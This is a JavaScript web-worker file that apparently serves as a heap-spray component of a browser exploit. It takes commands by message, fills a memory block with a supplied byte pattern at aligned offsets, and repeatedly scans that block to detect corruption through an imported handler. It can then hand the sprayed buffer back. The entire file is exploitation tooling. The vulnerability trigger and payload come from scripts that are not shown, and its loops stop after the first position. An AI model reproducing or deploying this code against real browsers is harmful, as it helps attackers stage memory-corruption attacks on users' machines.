var HEAP_SPRAY = 0;
var HEAP_SCAN = 1;
var HEAP_GET_MEM = 2;
var HEAP_STOP = 3;
var HEAP_TERMINATE = 3;

var m_id = 0;
var m_alig = 1;
var m_skippedBytes = 0;

var m_data;
var m_memory;

var m_stop = false;
var m_initialized = false;

importScripts('/hs/MemoryPatchHandler.js');

onmessage = function(e)
{
	var data = e.data;
	switch (data.cmd)
	{
		case HEAP_SPRAY:
			SprayMemory(data.alig, data.buff, data.skipped, data.id);
			break;
		case HEAP_SCAN:
			ScanMemory();
			break;
		case HEAP_GET_MEM:
			GetMemory();
			break;
		case HEAP_STOP:
			m_stop = true;
			return;
			
		default:
		case HEAP_TERMINATE:
			delete m_memory.buffer;
			self.close();
			return;
	}
	postMessage( { "id" : m_id, "cmd" : data.cmd } );
}

function SprayMemory(alig, buff, skipped, id)
{
	if (m_initialized)
		return;

	m_id = id;
	m_alig = alig;
	m_data = buff;
	m_skippedBytes = skipped;
	
	m_memory = new Uint8Array(HEAP_BLOCK_SIZE);
	
	if (m_data.length)
    {
		//first 0x20b is header
        for (var pos = m_skippedBytes; pos < m_memory.byteLength; pos = m_skippedBytes + ((pos + m_data.length + m_alig) & (~m_alig)))
        {
            for (var i = 0; i < m_data.length; i++)
				m_memory[pos + i] = m_data[i];//++;
			break;
        }
    }
	
	m_initialized = true;
}

function ScanMemory()
{
	if (m_initialized && m_data.length)
    {
		//first 0x20b is header
        for (var pos = m_skippedBytes; pos < m_memory.byteLength; pos = m_skippedBytes + ((pos + m_data.length + m_alig) & (~m_alig)))
        {
            for (var i = 0; i < m_data.length; i++)
				if (m_memory[pos + i] != m_data[i])
				{
					if (MemoryChangeDetected(pos, i))
						return;

					break;				
				}

			break;
        }
    }
	
	if (m_stop)
	{	
		postMessage( { "id" : m_id, "cmd" : HEAP_STOP } );
		return;
	}
	setTimeout(ScanMemory, 0x100);	
}
//get by ref
function GetMemory()
{
	if (m_initialized)
	{
		m_initialized = false;
		postMessage(m_memory.buffer, [m_memory.buffer]);
	}
	else
	{
		postMessage([]);
	}
}
